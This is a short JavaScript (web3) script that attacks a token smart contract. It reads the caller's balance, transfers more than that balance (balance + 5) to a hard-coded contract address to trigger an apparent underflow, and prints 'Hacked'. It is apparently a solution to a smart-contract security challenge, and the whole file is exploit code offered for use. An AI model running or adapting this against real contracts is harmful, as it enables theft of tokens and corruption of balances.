const { web3, dotenv } = require("./common.js");
dotenv.config();
const abi = require("./build/contracts/Token.json").abi;

(async () => {
  try {
    let contract = new web3.eth.Contract(
      abi,
      "0x94aB1e8a5621A527EbCf1cAf71795159e5834a9E"
    );
    const balance = await contract.methods
      .balanceOf(process.env.WALLET_ADDRESS)
      .call({ from: process.env.WALLET_ADDRESS });
    await contract.methods
      .transfer("0x94aB1e8a5621A527EbCf1cAf71795159e5834a9E", balance + 5)
      .send({ from: process.env.WALLET_ADDRESS });
    console.log("Hacked");
  } catch (e) {
    console.log(e.message);
  }
})();
